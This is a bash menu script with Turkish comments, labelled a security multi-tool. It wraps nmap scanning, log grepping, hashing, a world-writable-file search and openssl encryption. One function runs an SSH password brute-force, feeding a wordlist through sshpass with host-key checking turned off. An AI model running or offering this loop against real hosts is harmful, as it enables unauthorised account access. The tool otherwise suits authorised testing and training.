#!/bin/bash

# Renkli çıktılar için yardımcı işlevler
info() { echo -e "\e[34m[INFO]\e[0m $1"; }
success() { echo -e "\e[32m[SUCCESS]\e[0m $1"; }
error() { echo -e "\e[31m[ERROR]\e[0m $1"; }

# Ağ tarama (Nmap)
network_scan() {
    read -p "Taranacak IP aralığını girin (örnek: 192.168.1.0/24): " ip_range
    info "Ağ taraması başlatılıyor..."
    nmap -sV $ip_range
    success "Ağ taraması tamamlandı."
}

# Log analizi
log_analysis() {
    read -p "Analiz edilecek log dosyasının yolunu girin: " log_file
    read -p "Aranacak kelime veya desen (örnek: 'Failed password'): " pattern
    info "Log analizi başlatılıyor..."
    grep "$pattern" $log_file | sort | uniq -c | sort -nr
    success "Log analizi tamamlandı."
}

# Hash kontrolü
hash_check() {
    read -p "Hash alınacak dosyanın yolunu girin: " file
    info "SHA256 hash hesaplanıyor..."
    sha256sum $file
    success "Hash hesaplama tamamlandı."
}

# SSH brute force testi
ssh_bruteforce() {
    read -p "Test edilecek SSH hedefi (örnek: user@192.168.1.10): " target
    read -p "Şifre listesi dosyasının yolunu girin: " wordlist
    info "Brute force testi başlatılıyor..."
    while read password; do
        sshpass -p "$password" ssh -o StrictHostKeyChecking=no $target exit 2>/dev/null && success "Başarıyla giriş yapıldı: $password" && break
    done < $wordlist
    error "Tüm şifreler denendi, giriş yapılamadı."
}

# Zayıf dosya izinlerini bulma
find_weak_permissions() {
    read -p "Taranacak dizin (örnek: /etc): " directory
    info "Zayıf dosya izinleri aranıyor..."
    find $directory -type f -perm 777
    success "Tarama tamamlandı."
}

# Dosya şifreleme
file_encrypt() {
    read -p "Şifrelenecek dosyanın yolunu girin: " file
    read -p "Şifreleme için parola girin: " -s password
    info "\nDosya şifreleniyor..."
    echo $password | openssl enc -aes-256-cbc -salt -in $file -out ${file}.enc -pass stdin
    success "Dosya şifreleme tamamlandı: ${file}.enc"
}

# Menü
while true; do
    echo -e "\nCyberSec Multi-Tool"
    echo "1) Ağ Taraması"
    echo "2) Log Analizi"
    echo "3) Hash Kontrolü"
    echo "4) SSH Brute Force Testi"
    echo "5) Zayıf Dosya İzinlerini Bulma"
    echo "6) Dosya Şifreleme"
    echo "7) Çıkış"
    read -p "Seçiminizi yapın: " choice

    case $choice in
        1) network_scan ;;
        2) log_analysis ;;
        3) hash_check ;;
        4) ssh_bruteforce ;;
        5) find_weak_permissions ;;
        6) file_encrypt ;;
        7) exit 0 ;;
        *) error "Geçersiz seçim!" ;;
    esac
done